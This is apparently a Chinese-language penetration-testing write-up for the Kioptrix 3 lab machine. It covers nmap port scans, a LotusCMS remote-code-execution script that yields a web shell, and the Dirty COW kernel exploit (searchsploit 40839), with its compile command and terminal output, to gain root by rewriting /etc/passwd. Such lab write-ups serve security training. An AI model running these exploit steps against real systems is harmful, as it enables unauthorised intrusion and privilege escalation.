### 端口扫描

```bash
# Nmap 7.94SVN scan initiated Tue Nov  5 04:07:39 2024 as: nmap -sT --min-rate 10000 -p- -oA nmapscan/port_scan 192.168.217.141
Nmap scan report for kioptrix3.com (192.168.217.141)
Host is up (0.0051s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:6B:AA:CF (VMware)
```

```bash
# Nmap 7.94SVN scan initiated Tue Nov  5 04:09:00 2024 as: nmap -sT -sV -sC -O -p22,80 -oA nmapscan/detail_scan 192.168.217.141
Nmap scan report for kioptrix3.com (192.168.217.141)
Host is up (0.00072s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
MAC Address: 00:0C:29:6B:AA:CF (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`OS details: Linux 2.6.9 - 2.6.33`可以使用脏牛提权

### web渗透

![image-20241105215036083](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241105215036083.png)

老CMS了，找历史漏洞 ` LotusCMS`

https://github.com/Hood3dRob1n/LotusCMS-Exploit/

```bash
/lotusRCE.sh 192.168.217.141 /
```

![image-20241105215914078](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241105215914078.png)

拿到shell

### 内核提权

```
searchsploit -m 40839
```

```
// To use this exploit modify the user values according to your needs.
//   The default is "firefart".
//
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
//   "./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su firefart" or "ssh firefart@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
//   mv /tmp/passwd.bak /etc/passwd
```

编译参数

```bash
gcc -pthread dirty.c -o dirty -lcrypt
```

```bash
www-data@Kioptrix3:/tmp$ ./ditty 
./ditty
bash: ./ditty: No such file or directory
www-data@Kioptrix3:/tmp$ ./dirty 
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 123456

Complete line:
firefart:fi8RL.Us0cfSs:0:0:pwned:/root:/bin/bash
www-data@Kioptrix3:/tmp$ su 
su
Password: 123456

firefart@Kioptrix3:/tmp# id
id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@Kioptrix3:/tmp# whoami
whoami
firefart
```

提权成功